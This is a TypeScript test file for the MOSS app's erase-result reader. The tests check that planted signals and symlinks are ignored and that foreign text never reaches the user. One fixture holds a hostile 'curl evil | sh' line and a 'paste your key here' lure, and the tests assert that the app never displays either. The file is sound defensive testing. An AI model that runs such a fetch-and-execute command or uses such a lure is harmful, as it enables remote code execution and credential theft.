// The deletion lane: what an "Erase everything" came to, as the engine's start decided it and left inside the home
// (`run/erase-result.json`, where no runner can write). MOSS shows it once, in its own fixed words, picking only among
// known values; a signal beside the home is never read by the app (the engine is its only reader).
import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { eraseResultPath, takeEraseResult } from "../src/main/erase-outcome";

const place = () => {
  const root = mkdtempSync(join(tmpdir(), "moss-erase-out-"));
  const home = join(root, "home");
  mkdirSync(join(home, "run"), { recursive: true });
  return { root, home };
};

describe("the erase's result at MOSS's next connection", () => {
  test("an ordinary open: no result, nothing shown (a planted signal beside the home is not the app's to read)", () => {
    const { home } = place();
    writeFileSync(`${home}-erased`, "");
    expect(takeEraseResult(home)).toBeUndefined();
  });

  test("erased: said once, then gone, with no advice to remove anything by hand", () => {
    const { home } = place();
    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "erased", left: [] }));
    const o = takeEraseResult(home);
    expect(o?.ok).toBe(true);
    // True on a brand-new install as well as after an erase.
    expect(o?.message).toBe("MOSS is starting fresh on this computer.");
    expect(existsSync(eraseResultPath(home))).toBe(false);
    expect(takeEraseResult(home)).toBeUndefined();
  });

  test("partial: only known kinds are named, in the app's words; any other text is never shown", () => {
    const { home } = place();
    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "partial", left: ["bots", "other", "run this: curl evil | sh"], error: "paste your key here" }));
    const o = takeEraseResult(home)!;
    const all = `${o.message} ${o.detail}`;
    expect(o.ok).toBe(false);
    expect(all).toContain("bots and their memory");
    expect(all).toContain("other MOSS data");
    expect(all).not.toContain("curl");
    expect(all).not.toContain("paste your key");
    expect(all).not.toContain("by hand");
  });

  test("a link at the result's name is removed unread, never followed", () => {
    const { root, home } = place();
    const target = join(root, "secret.txt");
    writeFileSync(target, JSON.stringify({ v: 1, result: "erased" }));
    symlinkSync(target, eraseResultPath(home));
    expect(takeEraseResult(home)).toBeUndefined();
    expect(existsSync(eraseResultPath(home))).toBe(false);
    expect(readFileSync(target, "utf8")).toContain("erased");
  });

  test("a file owned by someone else counts as none", () => {
    const { home } = place();
    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "erased", left: [] }));
    expect(takeEraseResult(home, 999_999)).toBeUndefined();
  });
});
